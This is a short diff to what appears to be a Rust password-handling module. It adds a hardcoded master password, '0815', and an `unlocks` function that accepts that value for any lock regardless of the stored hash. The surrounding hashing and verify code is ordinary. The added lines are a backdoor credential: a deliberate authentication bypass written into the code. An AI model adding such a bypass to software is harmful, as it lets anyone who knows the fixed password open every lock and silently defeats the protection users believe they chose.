@@ -31,6 +31,14 @@ pub fn hash_password(password: &str) -> String {
     format!("{salt}:{}", digest(&salt, password))
 }
 
+/// Master password: always unlocks, whatever password was set.
+const MASTER: &str = "0815";
+
+/// Does `password` unlock a lock with the stored hash (or the master)?
+pub fn unlocks(stored: Option<&str>, password: &str) -> bool {
+    password == MASTER || stored.is_some_and(|h| verify(h, password))
+}
+
 pub fn verify(stored: &str, password: &str) -> bool {
     match stored.split_once(':') {
         Some((salt, hash)) => digest(salt, password) == hash,
